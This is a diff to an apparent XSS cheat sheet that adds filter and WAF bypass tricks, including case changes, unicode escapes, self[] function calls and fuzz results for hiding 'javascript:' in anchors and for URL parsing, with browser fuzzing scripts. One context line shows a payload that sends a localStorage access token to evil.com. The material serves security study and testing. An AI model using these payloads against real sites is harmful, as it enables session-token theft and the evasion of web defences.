@@ -34,7 +34,9 @@ document.location='//evil.com?t='.concat(localStorage.getItem('access_token'));
 
 ## Filter/WAF Bypass
 
-Basic filter bypass:
+- HTML entity list: [Named character references](https://html.spec.whatwg.org/multipage/named-characters.html#named-character-references)
+
+### Basic filter bypass
 
 ```html
 <!-- Alternate case -->
@@ -50,6 +52,8 @@ alert`1`
 \u0061\u006C\u0065\u0072\u0074("XSS")
 ```
 
+### Variable self
+
 Call a function using `self["<func_name>"]()`:
 
 ```html
@@ -59,6 +63,89 @@ self[Object.keys(self)[5]]("XSS")
 > Object.keys(self)
 >>> Array(316) [ "close", "stop", "focus", "blur", "open", "alert", "confirm", "prompt", "print", "postMessage", … ]
 ```
+
+### Anchors fuzzing
+
+#### Javascript protocol
+
+```js
+FUZZjavascript:alert()
+=> FUZZ: 0x0 to 0x1F (containing \t, \n, \r and space)
+
+javascriptFUZZ:alert()
+=> FUZZ: 9, 10, 13, 58 (respectively \t, \n, \r, :)
+
+javaFUZZscript:alert()
+=> FUZZ: 9, 10, 13 (respectively \t, \n, \r)
+
+&#FUZZ;javascript:alert()
+=> FUZZ: 0x1 to 0x1F (containing \t, \n, \r and space)
+```
+
+{{< details "Multiple characters" >}}
+Note that you can use multiple characters:
+
+```html
+<a href="java
+
+
+script:alert()">link</a>
+<a href="			javascript:alert()">link2</a>
+```
+{{< /details >}}
+
+{{< details "JavaScript Fuzzing script" >}}
+```html
+<body><script>
+let valids = [];
+for (let i = 0; i <= 0x10FFFF; i++) {
+	document.body.innerHTML = `<a href="&#${i};javascript:void(0)"></a>`;
+	let anchor = document.body.firstChild;
+	if (anchor.protocol == "javascript:")
+		valids.push(i);
+}
+console.log(valids);
+</script></body>
+```
+
+> Inspired by the book *Javascript for hackers - Gareth Heyes*.
+{{< /details >}}
+
+#### URLs
+
+```js
+FUZZhttps://xanhacks.xyz
+=> FUZZ: 0x1 to 0x1F (containing \t, \n, \r and space)
+
+https:/FUZZ/xanhacks.xyz
+=> FUZZ: 9, 10, 13, 47, 92 (respectively \t, \n, \r, /, \)
+
+/FUZZ/xanhacks.xyz
+=> FUZZ: 9, 10, 13 (respectively \t, \n, \r) - Chrome based
+=> FUZZ: Nothing - Firefox
+
+https://FUZZxanhacks.xyz
+=> FUZZ: 9, 10, 13, 47, 64, 92, 173, 847, 6155, 6156, ... a lot
+```
+
+> Note: `<a href="https://///////xanhacks.xyz">link</a>` goes to `https://xanhacks.xyz`.
+
+{{< details "URLs Fuzzing script" >}}
+```html
+<body><script>
+let valids = [];
+for (let i = 0; i <= 0x10FFFF; i++) {
+	document.body.innerHTML = `<a href="${String.fromCodePoint(i)}https://xanhacks.xyz"></a>`;
+	let anchor = document.body.firstChild;
+	if (anchor.hostname == "xanhacks.xyz")
+		valids.push(i);
+}
+console.log(valids);
+</script></body>
+```
+
+> Inspired by the book *Javascript for hackers - Gareth Heyes*.
+{{< /details >}}
 
 ## DOS
 
